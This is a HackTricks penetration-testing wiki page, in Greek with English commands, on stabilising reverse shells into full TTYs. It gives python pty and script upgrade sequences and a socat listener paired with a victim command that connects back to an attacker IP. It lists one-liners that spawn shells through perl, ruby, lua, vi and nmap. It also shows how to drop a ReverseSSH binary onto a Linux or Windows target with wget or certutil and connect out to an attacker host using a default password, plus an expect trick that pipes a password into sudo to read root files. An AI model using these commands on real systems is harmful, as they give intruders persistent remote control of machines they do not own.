# Full TTYs

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Full TTY

Σημειώστε ότι το shell που ορίζετε στη μεταβλητή `SHELL` **πρέπει** να είναι **καταχωρημένο μέσα** _**/etc/shells**_ ή `Η τιμή για τη μεταβλητή SHELL δεν βρέθηκε στο αρχείο /etc/shells. Αυτό το περιστατικό έχει αναφερθεί`. Επίσης, σημειώστε ότι τα επόμενα αποσπάσματα λειτουργούν μόνο σε bash. Αν βρίσκεστε σε zsh, αλλάξτε σε bash πριν αποκτήσετε το shell εκτελώντας `bash`.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
Μπορείτε να αποκτήσετε τον **αριθμό** των **γραμμών** και **στηλών** εκτελώντας **`stty -a`**
{% endhint %}

#### script

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

Ένας βολικός τρόπος για **interactive shell access**, καθώς και **file transfers** και **port forwarding**, είναι η τοποθέτηση του στατικά συνδεδεμένου ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στον στόχο.

Παρακάτω είναι ένα παράδειγμα για `x86` με upx-compressed binaries. Για άλλα binaries, ελέγξτε τη [σελίδα εκδόσεων](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Ετοιμάστε τοπικά για να πιάσετε το αίτημα port forwarding του ssh:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) Στόχος Linux:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Στόχος Windows 10 (για παλαιότερες εκδόσεις, ελέγξτε το [project readme](https://github.com/Fahrj/reverse-ssh#features)):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* Αν το αίτημα προώθησης θύρας ReverseSSH ήταν επιτυχές, θα πρέπει τώρα να μπορείτε να συνδεθείτε με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls` στο πλαίσιο του χρήστη που εκτελεί το `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

Η Penelope (https://github.com/brightio/penelope) αναβαθμίζει αυτόματα τα Linux reverse shells σε TTY, διαχειρίζεται το μέγεθος του τερματικού, καταγράφει τα πάντα και πολλά άλλα. Επίσης, παρέχει υποστήριξη readline για Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Αν για κάποιο λόγο δεν μπορείτε να αποκτήσετε ένα πλήρες TTY, **μπορείτε ακόμα να αλληλεπιδράσετε με προγράμματα** που περιμένουν είσοδο από τον χρήστη. Στο παρακάτω παράδειγμα, ο κωδικός πρόσβασης περνάει στο `sudo` για να διαβάσει ένα αρχείο:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
